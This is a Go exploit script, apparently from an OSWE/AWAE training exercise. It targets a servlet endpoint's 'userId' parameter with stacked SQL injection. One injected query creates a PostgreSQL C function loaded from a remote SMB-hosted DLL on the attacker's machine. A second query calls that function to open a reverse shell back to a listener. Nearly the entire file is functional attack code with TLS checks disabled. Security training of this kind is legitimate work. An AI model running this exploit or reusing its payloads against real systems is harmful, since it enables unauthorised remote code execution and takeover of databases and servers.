package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/url"
	"os"
)

// Ex 5.7.1.1 - Create UDF with remote DLL and trigger UDF

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func createUDF(debug bool, ip, listenerIP string) bool {
	sqli := fmt.Sprintf("1;CREATE OR REPLACE FUNCTION rev_shell(text, integer) "+
		"RETURNS void AS $$\\\\%s\\awae\\awae.dll$$, $$connect_back$$ LANGUAGE C STRICT;--", listenerIP)

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

	postRequest := utils.PostRequest{
		ContentType: "form",
		FormData: url.Values{
			"ForMasRange": {"1"},
			"userId":      {sqli},
		},
	}

	// send the request
	utils.PrintInfo("Creating UDF...")
	utils.PrintInfo("Sending query: " + sqli)
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	if response.StatusCode == 200 {
		return true
	}

	return false
}

func triggerUDF(debug bool, ip, listenerIP, listenerPort string) bool {
	sqli := fmt.Sprintf("1;SELECT rev_shell($$%s$$, %s);--", listenerIP, listenerPort)

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

	postRequest := utils.PostRequest{
		ContentType: "form",
		FormData: url.Values{
			"ForMasRange": {"1"},
			"userId":      {sqli},
		},
	}

	// send the request
	utils.PrintInfo("Triggering UDF - rev_shell()...")
	utils.PrintInfo("Sending query: " + sqli)
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	if response.StatusCode == 200 {
		return true
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target> <listenerIP> <listenerPort>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 192.168.45.152 1337", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	listenerIP := flag.Arg(1)
	listenerPort := flag.Arg(2)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	if createUDF(*debug, ip, listenerIP) {
		utils.PrintSuccess("UDF created!")
		fmt.Println("")
	} else {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
	}

	if triggerUDF(*debug, ip, listenerIP, listenerPort) {
		utils.PrintSuccess("Done... Check listener for reverse shell!")
	} else {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
	}
}
